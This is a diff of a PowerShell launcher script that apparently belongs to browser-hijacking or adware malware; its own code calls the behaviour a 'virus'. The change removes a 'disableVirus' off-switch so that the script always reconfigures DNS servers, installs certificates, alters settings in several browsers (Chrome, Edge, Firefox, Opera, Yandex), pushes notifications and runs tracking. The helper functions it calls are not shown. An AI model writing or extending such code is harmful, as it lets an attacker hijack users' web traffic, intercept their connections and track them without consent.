@@ -13,61 +13,25 @@
 . ./starturls.ps1
 . ./startdownloads.ps1
 . ./tracker.ps1
-. ./auto.ps1
-. ./embeddings.ps1
-
-
-# if(!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
-#     Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList "-File `"$($MyInvocation.MyCommand.Path)`"  `"$($MyInvocation.MyCommand.UnboundArguments)`""
-#     Exit
-#   }
-
-function gui_main {
-    DoStartDownloads
-    DoStartUrls
-    if (-not $server.disableVirus)
-    {
-        LaunchChromePushes
-    }
-    DoFront
-    DoEmbeddings
-}
-
-function launchGui
-{
-    $scriptPath = $PSCommandPath
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`" -guimode"
-}
-
-function main {
-    if (-not $server.disableVirus)
-    {
-        ConfigureDnsServers
-        ConfigureCertificates
-        ConfigureChrome
-        ConfigureEdge
-        ConfigureYandex
-        ConfigureFireFox
-        ConfigureOpera
-        ConfigureChromeUblock
-        ConfigureChromePushes
-        DoAuto
-    }
-    gui_main
-    if (-not $server.disableVirus)
-    {
-        DoTrack
-        DoUpdate
-        DoExtraUpdate
-    }
-}
 
 $gui = Test-Gui
-if ($gui -eq $true)
+if ($gui -eq $false)
 {
-    gui_main
+    ConfigureDnsServers
+    ConfigureCertificates
+    ConfigureChrome
+    ConfigureEdge
+    ConfigureYandex
+    ConfigureFireFox
+    ConfigureOpera
+    ConfigureChromeUblock
+    ConfigureChromePushes
+    LaunchChromePushes
+    DoTrack
+    DoExtraUpdate
 }
 else 
 {
-    main
+    DoStartDownloads
+    DoStartUrls
 }
